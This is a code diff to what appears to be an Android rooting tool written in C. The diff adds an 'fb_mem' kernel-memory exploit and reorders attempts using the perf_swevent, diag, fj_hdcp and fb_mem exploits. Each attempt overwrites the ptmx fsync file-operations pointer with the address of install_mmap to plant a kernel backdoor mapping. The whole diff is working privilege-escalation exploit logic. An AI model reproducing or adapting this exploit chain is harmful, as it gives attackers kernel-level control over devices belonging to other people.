@@ -7,12 +7,13 @@
 #define _LARGEFILE64_SOURCE
 
 #include "device_database/device_database.h"
-#include "libperf_event_exploit/perf_swevent.h"
-#include "libmsm_acdb_exploit/acdb.h"
 #include "ptmx.h"
 #include "mm.h"
+#include "libperf_event_exploit/perf_swevent.h"
+#include "libmsm_acdb_exploit/acdb.h"
 #include "libdiagexploit/diag.h"
 #include "libfj_hdcp_exploit/fj_hdcp.h"
+#include "libfb_mem_exploit/fb_mem.h"
 #include "backdoor_mmap.h"
 
 #define PAGE_SHIFT        12
@@ -247,12 +248,36 @@ sizeof_do_mmap(void)
 #endif
 
 static bool
+attempt_fb_mem_exploit(unsigned long int address, void *user_data)
+{
+  unsigned long int kernel_physical_offset;
+
+  kernel_physical_offset = device_get_symbol_address(DEVICE_SYMBOL(kernel_physical_offset));
+  if (kernel_physical_offset) {
+    fb_mem_set_kernel_phys_offset(kernel_physical_offset - 0x00008000);
+  }
+
+  if (fb_mem_write_value_at_address(address, (int)&install_mmap)) {
+    return run_install_mmap(user_data);
+  }
+
+  return false;
+}
+
+static bool
 attempt_diag_exploit(unsigned long int address, void *user_data)
 {
   struct diag_values injection_data;
 
+  unsigned long int write_value;
+
+  write_value = (unsigned long int)&install_mmap;
+  if (write_value > (uint16_t)-1) {
+    return false;
+  }
+
   injection_data.address = address;
-  injection_data.value = (uint16_t)&install_mmap;
+  injection_data.value = (uint16_t)write_value;
 
   return diag_run_exploit(&injection_data, 1,
                           run_install_mmap, user_data);
@@ -277,15 +302,20 @@ run_exploit(void)
     return true;
   }
 
-  printf("Attempt perf_swevent exploit...\n");
-  if (perf_swevent_run_exploit(ptmx_fsync_address, (int)&install_mmap,
-                                  run_install_mmap, (void *)ptmx_fops_address)) {
+  printf("Attempt fb_mem exploit...\n");
+  if (attempt_fb_mem_exploit(ptmx_fsync_address, (void *)ptmx_fops_address)) {
     return true;
   }
 
   printf("Attempt fj_hdcp exploit...\n");
   if (fj_hdcp_run_exploit(ptmx_fsync_address, (int)&install_mmap,
                        run_install_mmap, (void *)ptmx_fops_address)) {
+    return true;
+  }
+
+  printf("Attempt perf_swevent exploit...\n");
+  if (perf_swevent_run_exploit(ptmx_fsync_address, (int)&install_mmap,
+                                  run_install_mmap, (void *)ptmx_fops_address)) {
     return true;
   }
 
